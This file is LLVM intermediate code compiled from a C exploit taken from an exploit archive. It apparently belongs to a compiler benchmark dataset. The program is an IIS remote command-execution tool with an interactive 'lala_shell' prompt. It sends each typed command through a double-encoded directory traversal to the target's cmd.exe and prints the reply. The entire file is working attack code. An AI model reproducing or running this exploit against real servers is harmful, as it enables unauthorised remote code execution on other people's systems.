; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_20838.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_20838.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i64 }
%struct.sockaddr_in = type { i32, i32, i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [38 x i8] c":: lalaiis.c exploit. Coded by MovAX\0A\00", align 1
@.str.1 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@stderr = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [19 x i8] c"put a damn server\0A\00", align 1
@.str.3 = private unnamed_addr constant [30 x i8] c"\0A:: Destination host > %s:%d\0A\00", align 1
@.str.4 = private unnamed_addr constant [25 x i8] c"put a damn VALID server\0A\00", align 1
@.str.5 = private unnamed_addr constant [14 x i8] c"\0Alala_shell> \00", align 1
@stdin = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [5 x i8] c"gets\00", align 1
@.str.7 = private unnamed_addr constant [7 x i8] c"logout\00", align 1
@.str.8 = private unnamed_addr constant [6 x i8] c"GET /\00", align 1
@.str.9 = private unnamed_addr constant [66 x i8] c"/..%255c..%255c..%255c..%255c..%255c../winnt/system32/cmd.exe?/c+\00", align 1
@.str.10 = private unnamed_addr constant [11 x i8] c" HTTP/1.1\0A\00", align 1
@.str.11 = private unnamed_addr constant [6 x i8] c"host:\00", align 1
@.str.12 = private unnamed_addr constant [3 x i8] c"\0A\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@PF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@.str.13 = private unnamed_addr constant [8 x i8] c"socket\0A\00", align 1
@.str.14 = private unnamed_addr constant [8 x i8] c"connect\00", align 1
@.str.15 = private unnamed_addr constant [3 x i8] c"%c\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca [1 x i8], align 1
  %13 = alloca [512 x i8], align 16
  %14 = alloca [1024 x i8], align 16
  %15 = alloca [8192 x i8], align 16
  %16 = alloca %struct.hostent*, align 8
  %17 = alloca %struct.sockaddr_in, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 80, i32* %10, align 4
  store i32 80, i32* %11, align 4
  %18 = bitcast [512 x i8]* %13 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %18, i8 0, i64 512, i1 false)
  %19 = bitcast [1024 x i8]* %14 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %19, i8 0, i64 1024, i1 false)
  %20 = bitcast [8192 x i8]* %15 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %20, i8 0, i64 8192, i1 false)
  %21 = bitcast i8* %20 to [8192 x i8]*
  %22 = getelementptr inbounds [8192 x i8], [8192 x i8]* %21, i32 0, i32 0
  store i8 71, i8* %22, align 16
  %23 = getelementptr inbounds [8192 x i8], [8192 x i8]* %21, i32 0, i32 1
  store i8 69, i8* %23, align 1
  %24 = getelementptr inbounds [8192 x i8], [8192 x i8]* %21, i32 0, i32 2
  store i8 84, i8* %24, align 2
  %25 = getelementptr inbounds [8192 x i8], [8192 x i8]* %21, i32 0, i32 3
  store i8 32, i8* %25, align 1
  %26 = getelementptr inbounds [8192 x i8], [8192 x i8]* %21, i32 0, i32 4
  store i8 47, i8* %26, align 4
  %27 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str, i64 0, i64 0))
  %28 = load i32, i32* %4, align 4
  %29 = icmp slt i32 %28, 3
  br i1 %29, label %30, label %32

30:                                               ; preds = %2
  %31 = call i32 (...) @usage()
  br label %32

32:                                               ; preds = %30, %2
  %33 = getelementptr inbounds [512 x i8], [512 x i8]* %13, i64 0, i64 0
  %34 = load i8**, i8*** %5, align 8
  %35 = getelementptr inbounds i8*, i8** %34, i64 1
  %36 = load i8*, i8** %35, align 8
  %37 = call i32 @strncpy(i8* %33, i8* %36, i32 512)
  %38 = getelementptr inbounds [512 x i8], [512 x i8]* %13, i64 0, i64 0
  %39 = call i32 @strcmp(i8* %38, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i64 0, i64 0))
  %40 = icmp ne i32 %39, 0
  br i1 %40, label %45, label %41

41:                                               ; preds = %32
  %42 = load i32, i32* @stderr, align 4
  %43 = call i32 @fprintf(i32 %42, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.2, i64 0, i64 0))
  %44 = call i32 (...) @usage()
  br label %45

45:                                               ; preds = %41, %32
  %46 = getelementptr inbounds [512 x i8], [512 x i8]* %13, i64 0, i64 0
  %47 = load i32, i32* %11, align 4
  %48 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.3, i64 0, i64 0), i8* %46, i32 %47)
  %49 = getelementptr inbounds [512 x i8], [512 x i8]* %13, i64 0, i64 0
  %50 = call %struct.hostent* @gethostbyname(i8* %49)
  store %struct.hostent* %50, %struct.hostent** %16, align 8
  %51 = icmp eq %struct.hostent* %50, null
  br i1 %51, label %52, label %56

52:                                               ; preds = %45
  %53 = load i32, i32* @stderr, align 4
  %54 = call i32 @fprintf(i32 %53, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.4, i64 0, i64 0))
  %55 = call i32 (...) @usage()
  br label %56

56:                                               ; preds = %52, %45
  br label %57

57:                                               ; preds = %208, %56
  %58 = getelementptr inbounds [1024 x i8], [1024 x i8]* %14, i64 0, i64 0
  store i8 0, i8* %58, align 16
  %59 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.5, i64 0, i64 0))
  %60 = getelementptr inbounds [1024 x i8], [1024 x i8]* %14, i64 0, i64 0
  %61 = load i32, i32* @stdin, align 4
  %62 = call i32* @fgets(i8* %60, i32 1024, i32 %61)
  %63 = icmp eq i32* %62, null
  br i1 %63, label %64, label %66

64:                                               ; preds = %57
  %65 = call i32 @perror(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i64 0, i64 0))
  br label %66

66:                                               ; preds = %64, %57
  %67 = getelementptr inbounds [1024 x i8], [1024 x i8]* %14, i64 0, i64 0
  %68 = call i32 @strlen(i8* %67)
  %69 = sub nsw i32 %68, 1
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds [1024 x i8], [1024 x i8]* %14, i64 0, i64 %70
  store i8 0, i8* %71, align 1
  %72 = getelementptr inbounds [1024 x i8], [1024 x i8]* %14, i64 0, i64 0
  %73 = call i32 @strcmp(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.7, i64 0, i64 0), i8* %72)
  %74 = icmp ne i32 %73, 0
  br i1 %74, label %77, label %75

75:                                               ; preds = %66
  %76 = call i32 @exit(i32 -1) #4
  unreachable

77:                                               ; preds = %66
  store i32 0, i32* %6, align 4
  br label %78

78:                                               ; preds = %95, %77
  %79 = load i32, i32* %6, align 4
  %80 = getelementptr inbounds [1024 x i8], [1024 x i8]* %14, i64 0, i64 0
  %81 = call i32 @strlen(i8* %80)
  %82 = icmp slt i32 %79, %81
  br i1 %82, label %83, label %98

83:                                               ; preds = %78
  %84 = load i32, i32* %6, align 4
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds [1024 x i8], [1024 x i8]* %14, i64 0, i64 %85
  %87 = load i8, i8* %86, align 1
  %88 = sext i8 %87 to i32
  %89 = icmp eq i32 %88, 32
  br i1 %89, label %90, label %94

90:                                               ; preds = %83
  %91 = load i32, i32* %6, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [1024 x i8], [1024 x i8]* %14, i64 0, i64 %92
  store i8 43, i8* %93, align 1
  br label %94

94:                                               ; preds = %90, %83
  br label %95

95:                                               ; preds = %94
  %96 = load i32, i32* %6, align 4
  %97 = add nsw i32 %96, 1
  store i32 %97, i32* %6, align 4
  br label %78

98:                                               ; preds = %78
  %99 = getelementptr inbounds [8192 x i8], [8192 x i8]* %15, i64 0, i64 0
  %100 = call i32 @strncpy(i8* %99, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.8, i64 0, i64 0), i32 8192)
  %101 = getelementptr inbounds [8192 x i8], [8192 x i8]* %15, i64 0, i64 0
  %102 = load i8**, i8*** %5, align 8
  %103 = getelementptr inbounds i8*, i8** %102, i64 2
  %104 = load i8*, i8** %103, align 8
  %105 = getelementptr inbounds [8192 x i8], [8192 x i8]* %15, i64 0, i64 0
  %106 = call i32 @strlen(i8* %105)
  %107 = sext i32 %106 to i64
  %108 = sub i64 8192, %107
  %109 = trunc i64 %108 to i32
  %110 = call i32 @strncat(i8* %101, i8* %104, i32 %109)
  %111 = getelementptr inbounds [8192 x i8], [8192 x i8]* %15, i64 0, i64 0
  %112 = getelementptr inbounds [8192 x i8], [8192 x i8]* %15, i64 0, i64 0
  %113 = call i32 @strlen(i8* %112)
  %114 = sext i32 %113 to i64
  %115 = sub i64 8192, %114
  %116 = trunc i64 %115 to i32
  %117 = call i32 @strncat(i8* %111, i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.9, i64 0, i64 0), i32 %116)
  %118 = getelementptr inbounds [8192 x i8], [8192 x i8]* %15, i64 0, i64 0
  %119 = getelementptr inbounds [1024 x i8], [1024 x i8]* %14, i64 0, i64 0
  %120 = getelementptr inbounds [8192 x i8], [8192 x i8]* %15, i64 0, i64 0
  %121 = call i32 @strlen(i8* %120)
  %122 = sext i32 %121 to i64
  %123 = sub i64 8192, %122
  %124 = trunc i64 %123 to i32
  %125 = call i32 @strncat(i8* %118, i8* %119, i32 %124)
  %126 = getelementptr inbounds [8192 x i8], [8192 x i8]* %15, i64 0, i64 0
  %127 = getelementptr inbounds [8192 x i8], [8192 x i8]* %15, i64 0, i64 0
  %128 = call i32 @strlen(i8* %127)
  %129 = sext i32 %128 to i64
  %130 = sub i64 8192, %129
  %131 = trunc i64 %130 to i32
  %132 = call i32 @strncat(i8* %126, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.10, i64 0, i64 0), i32 %131)
  %133 = getelementptr inbounds [8192 x i8], [8192 x i8]* %15, i64 0, i64 0
  %134 = getelementptr inbounds [8192 x i8], [8192 x i8]* %15, i64 0, i64 0
  %135 = call i32 @strlen(i8* %134)
  %136 = sext i32 %135 to i64
  %137 = sub i64 8192, %136
  %138 = trunc i64 %137 to i32
  %139 = call i32 @strncat(i8* %133, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.11, i64 0, i64 0), i32 %138)
  %140 = getelementptr inbounds [8192 x i8], [8192 x i8]* %15, i64 0, i64 0
  %141 = load i8**, i8*** %5, align 8
  %142 = getelementptr inbounds i8*, i8** %141, i64 1
  %143 = load i8*, i8** %142, align 8
  %144 = getelementptr inbounds [8192 x i8], [8192 x i8]* %15, i64 0, i64 0
  %145 = call i32 @strlen(i8* %144)
  %146 = sext i32 %145 to i64
  %147 = sub i64 8192, %146
  %148 = trunc i64 %147 to i32
  %149 = call i32 @strncat(i8* %140, i8* %143, i32 %148)
  %150 = getelementptr inbounds [8192 x i8], [8192 x i8]* %15, i64 0, i64 0
  %151 = getelementptr inbounds [8192 x i8], [8192 x i8]* %15, i64 0, i64 0
  %152 = call i32 @strlen(i8* %151)
  %153 = sext i32 %152 to i64
  %154 = sub i64 8192, %153
  %155 = trunc i64 %154 to i32
  %156 = call i32 @strncat(i8* %150, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.12, i64 0, i64 0), i32 %155)
  %157 = load i32, i32* @AF_INET, align 4
  %158 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  store i32 %157, i32* %158, align 4
  %159 = load i32, i32* %11, align 4
  %160 = call i32 @htons(i32 %159)
  %161 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i32 %160, i32* %161, align 4
  %162 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  %163 = bitcast i32* %162 to i8*
  %164 = load %struct.hostent*, %struct.hostent** %16, align 8
  %165 = getelementptr inbounds %struct.hostent, %struct.hostent* %164, i32 0, i32 0
  %166 = load i64, i64* %165, align 8
  %167 = inttoptr i64 %166 to i8*
  %168 = call i32 @memcpy(i8* %163, i8* %167, i32 4)
  %169 = load i32, i32* @PF_INET, align 4
  %170 = load i32, i32* @SOCK_STREAM, align 4
  %171 = load i32, i32* @IPPROTO_TCP, align 4
  %172 = call i32 @socket(i32 %169, i32 %170, i32 %171)
  store i32 %172, i32* %7, align 4
  %173 = icmp eq i32 %172, -1
  br i1 %173, label %174, label %177

174:                                              ; preds = %98
  %175 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.13, i64 0, i64 0))
  %176 = call i32 @exit(i32 -1) #4
  unreachable

177:                                              ; preds = %98
  %178 = load i32, i32* %9, align 4
  %179 = call i32 @alarm(i32 %178)
  %180 = load i32, i32* %7, align 4
  %181 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %182 = call i32 @connect(i32 %180, %struct.sockaddr* %181, i32 12)
  store i32 %182, i32* %8, align 4
  %183 = call i32 @alarm(i32 0)
  %184 = load i32, i32* %8, align 4
  %185 = icmp eq i32 %184, -1
  br i1 %185, label %186, label %189

186:                                              ; preds = %177
  %187 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.14, i64 0, i64 0))
  %188 = call i32 @exit(i32 -1) #4
  unreachable

189:                                              ; preds = %177
  %190 = load i32, i32* %7, align 4
  %191 = getelementptr inbounds [8192 x i8], [8192 x i8]* %15, i64 0, i64 0
  %192 = getelementptr inbounds [8192 x i8], [8192 x i8]* %15, i64 0, i64 0
  %193 = call i32 @strlen(i8* %192)
  %194 = call i32 @send(i32 %190, i8* %191, i32 %193, i32 0)
  br label %195

195:                                              ; preds = %200, %189
  %196 = load i32, i32* %7, align 4
  %197 = getelementptr inbounds [1 x i8], [1 x i8]* %12, i64 0, i64 0
  %198 = call i64 @recv(i32 %196, i8* %197, i32 1, i32 0)
  %199 = icmp sgt i64 %198, 0
  br i1 %199, label %200, label %208

200:                                              ; preds = %195
  %201 = load i32, i32* %10, align 4
  %202 = call i32 @alarm(i32 %201)
  %203 = getelementptr inbounds [1 x i8], [1 x i8]* %12, i64 0, i64 0
  %204 = load i8, i8* %203, align 1
  %205 = sext i8 %204 to i32
  %206 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i64 0, i64 0), i32 %205)
  %207 = call i32 @alarm(i32 0)
  br label %195

208:                                              ; preds = %195
  br label %57
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #1

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @usage(...) #2

declare dso_local i32 @strncpy(i8*, i8*, i32) #2

declare dso_local i32 @strcmp(i8*, i8*) #2

declare dso_local i32 @fprintf(i32, i8*) #2

declare dso_local %struct.hostent* @gethostbyname(i8*) #2

declare dso_local i32* @fgets(i8*, i32, i32) #2

declare dso_local i32 @perror(i8*) #2

declare dso_local i32 @strlen(i8*) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @strncat(i8*, i8*, i32) #2

declare dso_local i32 @htons(i32) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i32 @alarm(i32) #2

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #2

declare dso_local i32 @send(i32, i8*, i32, i32) #2

declare dso_local i64 @recv(i32, i8*, i32, i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
